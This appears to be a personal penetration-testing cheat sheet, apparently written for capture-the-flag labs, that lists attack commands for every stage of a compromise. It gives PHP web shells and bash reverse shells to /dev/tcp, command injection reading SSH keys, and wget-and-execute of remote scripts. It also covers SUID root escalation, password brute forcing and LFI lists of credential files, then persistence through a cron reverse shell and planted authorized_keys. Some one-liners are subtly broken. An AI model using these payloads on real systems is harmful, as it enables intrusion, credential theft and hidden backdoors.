# Most Important

https://book.hacktricks.xyz/welcome/readme

Check hacktricks on any subject. It'll probably have something useful.

Always try default credentials.

# Regular Expression

https://regex101.com/

Try to match expressions: think of it as really complicated grep.
# Reconnaissance
https://tio.run/#

```sudo nmap -sC -sV -v -p- 10.10.10.10 --min-rate 10000```

# Enumerating Directories with dirsearch

```dirsearch -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u 10.10.10.10```
```dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.10```

You can also run dirsearch on subdirectories (ie dirsearch website.com/api)

# Relevant File System Commands

```grep -r 'looking_for_this' /in/this/directory```

We want to find the text 'looking for this', in a certain directory. This is useful for finding out where a webpage is exactly. If you know that user www-data has a web page with the text "Welcome to our website!", you can search for that text, and find out where the webpage is. Once you know wher the webpages are hosted in the file system, you can manipulate them, edit them, put in a backdoor, among many things. 



```find / -name *flag* 2>/dev/null```
Looks for everything with flag in the filename. The last part is nessesary, otherwise the command will spam you with unsuccessful searches

# Locate File Location

``` locate file.ext ```
# Command Injection
```;cat /home/<user>/.ssh/id_rsa```


# SSH

```touch id.rsa ```

```Edit id.rsa```

```chmod 600 id.rsa```

```ssh -i id.rsa user@10.10.10.10```

# Getting Remote Command Execution

# File Upload Vulnerability

Open burpsuite, open an image file that only contains the backdoor, capture the request, and then add .php to the end of the file, so it tries uploading as test.jpg.php, test.gif.php

Can also just try uploading an image file that contains only the backdoor, and if a php exec() exists, that might hit it and give us a backdoor.

# PHP Payloads for File Upload Vulnerability

# Command Backdoor
```<?php echo passthru($_GET['cmd']); ?>```
Use like website.com/index.php?pg=/uploads/image.lol?cmd=ls

# Reverse Shell
```<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'"); ?>```

PHP will only execute on a non-PHP file (ie .jpg) if the .jpg includes a PHP includes. We can try 
```touch backdoor.jpg && echo "<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'"); ?>"```

# Privledge Escalation

https://gtfobins.github.io/

Do we have a suid binary? Check on GTFO bins to see if we can use this to get a root shell.

```wget 10.10.10.10:8080/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh```

Upload linPEAS or winPEAS, and see what they find.

```sudo -l```

Looks for SUID binaries.

```find / -perm -4000 2>/dev/null```

Looks for any SUID programs on the system.
```chmod +s /bin/bash```
If we have command injection anywhere, we can simply plug this into wherever we have command injection, and everytime /bin/bash is called, we get a root shell.



# Password Cracking

# John The Ripper

To crack a password-protected zip file, first convert it into a hash that John can read
```zip2john file-to-crack.zip > hashed.john```
And then call John on it
```john -w=/usr/share/wordlists/rockyou.txt hashed.john```

To crack a SSH key
```ssh2john encrypted-id.rsa > id.rsa.john```
```john -w=/usr/share/wordlists/rockyou.txt id.rsa.john```

# Hydra
```hydra -L users.txt -u -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh -s 2222 -V -t 64 -f```

General Help on Hydra
https://www.quora.com/Does-Hydra-stop-when-a-password-is-found


# Abusing Certain Services Angle

# WordPress
```wpscan -U username --url http://website.com/wordpress -P /usr/share/wordlists/rockyou.txt```

If we can grab wordpress admin credentials, we can pretty easily get a shell.

# PostGresSQL
```psql -h 10.10.10.10``` -u postgres default credentials are postgres and postgres

# MySQL
```mysql -h 10.10.70.250 -u root -p```

# FTP
ftp 10.10.10.10 


# NFS
```sudo showmount -e 10.10.10.10```
```mkdir mnt```
```sudo mount -t nfs 10.10.10.10:/ ./mnt -o nolock```

# Other/Interesting Angles



# Abusing Weird Text
If there's a weird page with only text, try nc into it, like nc 10.10.10.10 7878

# Overriding Weird Port Numbers on Firefox
need to go to about:config, and add the port you want to acess, so it can be overridden


# Abusing LFI


For Linux: 
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/root/.ssh/id_rsa
/root/.ssh/authorized_keys

For windows:
/home/user/.ssh/authorized_k
eys
/home/user/.ssh/id_rsa
/boot.ini
/autoexec.bat
/windows/system32/drivers/et
c/hosts
/windows/repair/SAM
/windows/panther/unattended.
xml
/windows/panther/unattend/u
# Getting Files to/from Server

Use a web server!
```python -m http.server 8080```

# Improving an improved shell

```python3 -c "import pty;pty.spawn('/bin/bash');"```

```bash -i```

# Useful One Liners, and General Persistence

```wget 10.10.10.10:8080/kingme.sh && chmod u+x kingme.sh && mkdir /etc/testingdirectory &&  ./kingme.sh - u jtrigg 10.10.10.10 /etc/testingdirectory```

```echo "bash -i >& /dev/tcp/127.0.0.1/8080 0>&1" > /tmp/backdoor.sh```

```wget 10.10.10.10:8080/id.pub && cp id2.pub /root/.ssh/authorized_keys/ && rm id.pub```

```wget 10.10.10.10:8080/id.pub && cp id2.pub /home/<user>/.ssh/authorized_keys/ && id.pub```

```cp /bin/bash /tmp/magic && chmod +s /tmp/magic```

Put the below into a file named backdoor.php, and put it in one of the websites, so you can access the page.
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'"); ?>

```crontab -l > mycron && echo "* * * * * bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" >> mycron && crontab mycron && rm mycron```

# Neat Links

https://pentestbook.six2dez.com/enumeration/ports

https://www.revshells.com/

# Ricing

```https://www.reddit.com/r/unixporn/comments/11zuyx2/i3_porpol/```

XFCE themes for Kali Desktop
```https://www.xfce-look.org/p/1253385?ref=itsfoss.com```
